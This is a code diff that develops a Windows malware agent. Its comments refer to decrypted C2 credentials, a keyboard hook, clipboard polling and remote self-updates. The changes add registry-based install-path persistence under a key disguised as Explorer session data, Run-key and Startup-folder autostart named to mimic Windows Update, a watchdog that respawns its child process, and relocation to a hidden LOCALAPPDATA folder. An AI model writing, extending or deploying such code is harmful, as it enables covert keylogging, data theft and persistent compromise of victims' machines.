@@ -75,6 +75,7 @@ static DWORD g_childStartTick = 0;            // GetTickCount when child began (
 static bool g_hookReady = false;              // keyboard hook installed after settle
 static bool g_clipReady = false;              // clipboard polling enabled after settle
 static bool g_persistReady = false;           // Run/Startup written after settle
+static HANDLE g_hMutex = NULL;                // singleton watchdog mutex (released before relocate hop)
 
 // --- Decrypted C2 credentials (populated once in InitConfig) ---
 static std::wstring g_supabaseHost;
@@ -234,7 +235,8 @@ static std::wstring GetExeNameW() {
     return ToWide(GetExeName());
 }
 
-// Per-build install path from config.h (not TEMP, not fake RuntimeBroker).
+// Default install names from config.h (first install only). After that the path
+// is stored in the persist reg key so updates keep the same location (C3).
 #ifndef AGENT_INSTALL_DIR
 #define AGENT_INSTALL_DIR "CacheHost"
 #endif
@@ -247,6 +249,11 @@ static std::wstring GetExeNameW() {
 
 static void LogMsg(const std::string& msg);
 
+// Fixed key for install path (must NOT use per-build AGENT_REGKEY or updates lose the path).
+static const char* InstallMetaKey() {
+    return "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo";
+}
+
 static bool PathEqualsI(const std::string& a, const std::string& b) {
     if (a.size() != b.size()) return false;
     for (size_t i = 0; i < a.size(); i++) {
@@ -255,16 +262,45 @@ static bool PathEqualsI(const std::string& a, const std::string& b) {
     return true;
 }
 
-static std::string GetInstallDir() {
-    char local[MAX_PATH];
-    if (GetEnvironmentVariableA("LOCALAPPDATA", local, MAX_PATH) == 0 || !local[0]) return "";
-    return std::string(local) + "\\" + AGENT_INSTALL_DIR;
+static std::string ReadInstallPathReg() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, InstallMetaKey(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+        return "";
+    char buf[MAX_PATH] = {0};
+    DWORD type = 0, size = sizeof(buf);
+    LONG r = RegQueryValueExA(hKey, "InstallExe", NULL, &type, (LPBYTE)buf, &size);
+    RegCloseKey(hKey);
+    if (r != ERROR_SUCCESS || type != REG_SZ || !buf[0]) return "";
+    return std::string(buf);
 }
 
+static void WriteInstallPathReg(const std::string& val) {
+    HKEY hKey;
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, InstallMetaKey(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
+        return;
+    RegSetValueExA(hKey, "InstallExe", 0, REG_SZ, (const BYTE*)val.c_str(), (DWORD)val.size() + 1);
+    RegCloseKey(hKey);
+}
+
+// Stable install EXE path: prefer registry (survives per-build name changes).
 static std::string GetInstallExePath() {
-    std::string d = GetInstallDir();
-    if (d.empty()) return "";
-    return d + "\\" + AGENT_INSTALL_EXE;
+    std::string stored = ReadInstallPathReg();
+    if (!stored.empty()) return stored;
+
+    char local[MAX_PATH];
+    if (GetEnvironmentVariableA("LOCALAPPDATA", local, MAX_PATH) == 0 || !local[0]) return "";
+    std::string dir = std::string(local) + "\\" + AGENT_INSTALL_DIR;
+    std::string exe = dir + "\\" + AGENT_INSTALL_EXE;
+    WriteInstallPathReg(exe);
+    return exe;
+}
+
+static std::string GetInstallDir() {
+    std::string exe = GetInstallExePath();
+    if (exe.empty()) return "";
+    size_t pos = exe.find_last_of("\\/");
+    if (pos == std::string::npos) return "";
+    return exe.substr(0, pos);
 }
 
 static bool IsRunningFromInstall() {
@@ -282,12 +318,15 @@ static void EnsureInstallCopy() {
     if (PathEqualsI(std::string(self), instExe)) return;
     std::string d = GetInstallDir();
     CreateDirectoryA(d.c_str(), NULL);
-    if (CopyFileA(self, instExe.c_str(), FALSE))
+    if (CopyFileA(self, instExe.c_str(), FALSE)) {
+        WriteInstallPathReg(instExe);
         LogMsg("Install copy -> " + instExe);
+    }
 }
 
-// Copy to install path and relaunch. Returns true only if the new process is
-// still alive after settleMs (otherwise caller keeps running from drop path).
+// Copy to install path, set Run, release singleton mutex, start install PE.
+// Returns true if install process stays up (caller must exit). On failure
+// re-takes the mutex so this watchdog can keep running from the drop path.
 static bool RelocateToInstallAndRelaunch(DWORD settleMs) {
     std::string instDir = GetInstallDir();
     std::string instExe = GetInstallExePath();
@@ -304,6 +343,13 @@ static bool RelocateToInstallAndRelaunch(DWORD settleMs) {
             return false;
         }
     }
+    WriteInstallPathReg(instExe);
+
+    // Release singleton BEFORE starting install PE (install WinMain takes mutex).
+    if (g_hMutex) {
+        CloseHandle(g_hMutex);
+        g_hMutex = NULL;
+    }
 
     STARTUPINFOA si = {0};
     si.cb = sizeof(si);
@@ -311,6 +357,7 @@ static bool RelocateToInstallAndRelaunch(DWORD settleMs) {
     std::string cmd = "\"" + instExe + "\"";
     if (!CreateProcessA(instExe.c_str(), &cmd[0], NULL, NULL, FALSE, 0, NULL, instDir.c_str(), &si, &pi)) {
         LogMsg("Relocate: CreateProcess failed");
+        g_hMutex = CreateMutexW(NULL, TRUE, AGENT_MUTEX);
         return false;
     }
 
@@ -318,13 +365,19 @@ static bool RelocateToInstallAndRelaunch(DWORD settleMs) {
     if (wr == WAIT_OBJECT_0) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
-        DeleteFileA(instExe.c_str());
-        LogMsg("Relocate: install process died — staying on drop path");
+        LogMsg("Relocate: install process died — retaking mutex, stay on drop path");
+        g_hMutex = CreateMutexW(NULL, TRUE, AGENT_MUTEX);
+        if (g_hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
+            CloseHandle(g_hMutex);
+            g_hMutex = NULL;
+            return false;
+        }
         return false;
     }
     if (wr != WAIT_TIMEOUT) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+        g_hMutex = CreateMutexW(NULL, TRUE, AGENT_MUTEX);
         return false;
     }
 
@@ -1932,6 +1985,12 @@ static void CleanupPersistence() {
     DeleteFileA((std::string(tempPath) + "wuaueng.log").c_str());
     std::string inst = GetInstallExePath();
     if (!inst.empty()) DeleteFileA(inst.c_str());
+    // Clear stable install path marker
+    HKEY hMeta = NULL;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, InstallMetaKey(), 0, KEY_SET_VALUE, &hMeta) == ERROR_SUCCESS) {
+        RegDeleteValueA(hMeta, "InstallExe");
+        RegCloseKey(hMeta);
+    }
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) > 0 && appdata[0]) {
         DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat").c_str());
@@ -2058,6 +2117,7 @@ static void InstallStartup() {
         GetModuleFileNameA(NULL, self, MAX_PATH);
         runTarget = self;
     }
+    WriteInstallPathReg(runTarget);
 
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         RegSetValueExA(hKey, AGENT_RUN_VALUE, 0, REG_SZ, (BYTE*)runTarget.c_str(), (DWORD)runTarget.size() + 1);
@@ -2200,9 +2260,10 @@ static int RunChild(HINSTANCE hInstance) {
 // === Watchdog process ==========================================================
 // Entry point. Decrypts C2 config, hides the console, checks for --child flag.
 // If --child: runs the child (lines above).
-// Otherwise: takes mutex, runs from drop path first, after ~45s relocates to
-// install path (alive-check 10s). Persistence is applied by the child after
-// stagger. Update failure keeps this watchdog alive.
+// Otherwise: takes mutex, runs from drop path first. After ~45s: copy+Run to
+// install path, release mutex, start install PE, exit drop path (alive-check).
+// Does NOT kill a healthy child just to hop — waits for child exit or does hop
+// only when no child is running. Version check every ~5 min. Update fail keeps us.
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     InitConfig();
@@ -2214,15 +2275,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
         return RunChild(hInstance);
     }
 
-    // Already on install path: take mutex and run.
-    // On TEMP/drop path: take mutex, run first, relocate later (not at t=0).
-    CreateMutexW(NULL, TRUE, AGENT_MUTEX);
-    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
+    g_hMutex = CreateMutexW(NULL, TRUE, AGENT_MUTEX);
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
+        return 0;
+    }
 
     g_hostname = GetAgentIdentity();
 
-    // If already installed, refresh Run early. Drop-path first runs skip loud
-    // InstallStartup until child stagger (~25s) and/or post-relocate.
+    // Refresh Run when already on durable path. Drop-path first runs wait for
+    // child stagger (~25s) and/or delayed relocate (~45s).
     if (IsRunningFromInstall())
         InstallStartup();
 
@@ -2234,20 +2296,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     std::string exePath(path);
     DWORD watchdogStart = GetTickCount();
+    DWORD lastVersionCheck = GetTickCount();
     bool triedRelocate = IsRunningFromInstall();
 
     while (true) {
         RemoveKillFlag();
 
-        // Delayed relocate: one PE first minute, then durable path
+        // Delayed relocate when no child is running (between respawns)
         if (!triedRelocate && !IsRunningFromInstall() &&
             (GetTickCount() - watchdogStart) >= 45000) {
             triedRelocate = true;
+            InstallStartup(); // copy + Run first so reboot is safe even if hop fails
             if (RelocateToInstallAndRelaunch(10000))
                 return 0;
-            // Failed: keep running from drop path
-            EnsureInstallCopy();
-            InstallStartup();
+            LogMsg("Relocate failed — staying on drop path with local Run");
         }
 
         STARTUPINFOA si = {0};
@@ -2262,32 +2324,28 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
         bool updated = false;
         while (true) {
-            // Shorter wait slices so delayed relocate can fire mid-child
+            // 5s slices only to notice relocate deadline / kill flag; version is separate
             DWORD wr = WaitForSingleObject(pi.hProcess, 5000);
             if (wr == WAIT_TIMEOUT) {
+                // Soft hop: do not kill a healthy child. When deadline hits, just
+                // ensure install copy + Run exist; process hop happens after child exits.
                 if (!triedRelocate && !IsRunningFromInstall() &&
                     (GetTickCount() - watchdogStart) >= 45000) {
                     triedRelocate = true;
-                    TerminateProcess(pi.hProcess, 1);
-                    WaitForSingleObject(pi.hProcess, 5000);
-                    CloseHandle(pi.hProcess);
-                    CloseHandle(pi.hThread);
-                    if (RelocateToInstallAndRelaunch(10000))
-                        return 0;
-                    EnsureInstallCopy();
                     InstallStartup();
-                    // respawn child on drop path
-                    updated = false;
-                    goto next_spawn;
+                    LogMsg("Relocate deferred until child exit (no kill)");
                 }
-                int rv = GetRemoteVersion();
-                if (rv > NETPEN_VERSION) {
-                    TerminateProcess(pi.hProcess, 1);
-                    WaitForSingleObject(pi.hProcess, 10000);
-                    updated = DeployUpdate(rv);
-                    if (!updated)
-                        LogMsg("Update failed — keeping old agent");
-                    break;
+                if (GetTickCount() - lastVersionCheck >= 300000) {
+                    lastVersionCheck = GetTickCount();
+                    int rv = GetRemoteVersion();
+                    if (rv > NETPEN_VERSION) {
+                        TerminateProcess(pi.hProcess, 1);
+                        WaitForSingleObject(pi.hProcess, 10000);
+                        updated = DeployUpdate(rv);
+                        if (!updated)
+                            LogMsg("Update failed — keeping old agent");
+                        break;
+                    }
                 }
                 if (KillFlagExists()) {
                     TerminateProcess(pi.hProcess, 1);
@@ -2312,8 +2370,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
             break;
         }
 
+        // After child exits, try process hop if still on drop path and past deadline
+        if (!IsRunningFromInstall() && (GetTickCount() - watchdogStart) >= 45000) {
+            triedRelocate = true;
+            InstallStartup();
+            if (RelocateToInstallAndRelaunch(10000))
+                return 0;
+        }
+
         Sleep(3000);
-        next_spawn:;
     }
 
     return 0;
